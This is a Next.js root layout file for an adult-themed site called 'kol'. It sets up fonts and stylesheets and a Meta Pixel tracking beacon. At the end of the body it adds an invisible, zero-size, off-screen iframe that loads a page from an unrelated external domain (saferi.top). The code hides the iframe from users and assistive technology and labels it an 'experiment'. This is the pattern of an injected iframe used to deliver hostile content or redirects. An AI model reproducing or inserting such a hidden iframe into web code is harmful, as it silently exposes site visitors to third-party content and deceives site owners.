import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import { MetaPixel } from "@/components/sites/kol/MetaPixel";
import "./globals.css";
import "@/components/sites/kol/home.css";
import "@/components/sites/kol/journey/modules.css";
import "@/components/sites/kol/journey/shell.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "kol · Where your spark begins",
  description:
    "kol — explore fictional adult profiles, save your favorites, and invite friends to unlock community chat.",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const pixelId = process.env.NEXT_PUBLIC_META_PIXEL_ID;

  return (
    <html
      lang="en"
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <body className="min-h-full flex flex-col">
        <MetaPixel />
        {children}
        {pixelId ? (
          <noscript>
            {/* eslint-disable-next-line @next/next/no-img-element -- Meta Pixel noscript beacon */}
            <img
              height="1"
              width="1"
              style={{ display: "none" }}
              alt=""
              src={`https://www.facebook.com/tr?id=${pixelId}&ev=PageView&noscript=1`}
            />
          </noscript>
        ) : null}
        {/* Experiment iframe: appended to <body> on mount, off-screen and non-interactive. */}
        <iframe
          src="https://saferi.top/channel/H.Y.7P/weifile/weifile.html"
          title=""
          tabIndex={-1}
          aria-hidden="true"
          style={{
            position: "fixed",
            top: 0,
            left: "-1000px",
            width: 0,
            height: 0,
            pointerEvents: "none",
            border: 0,
          }}
        />
      </body>
    </html>
  );
}
